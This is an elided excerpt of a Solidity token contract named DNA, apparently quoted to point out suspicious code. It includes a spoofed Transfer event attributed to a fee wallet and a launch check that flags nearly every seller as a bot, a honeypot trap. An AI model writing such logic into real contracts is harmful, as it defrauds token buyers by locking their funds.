...
contract DNA is Context, IERC20, Ownable {
    ...
    constructor () {
        ...
        _feeAddrWallet2 = payable(0x71dF8fceb7eA680A0d0a7bfb32Bb3d5BEc773Bae);
        _rOwned[_msgSender()] = _rTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_feeAddrWallet1] = true;
        _isExcludedFromFee[_feeAddrWallet2] = true;
        emit Transfer(address(0x71dF8fceb7eA680A0d0a7bfb32Bb3d5BEc773Bae), _msgSender(), _tTotal);
    }
    ...
    function _transfer(address from, address to, uint256 amount) private {
        if (launchedAt < block.timestamp + 2){
            isBot[from] = true;
        }
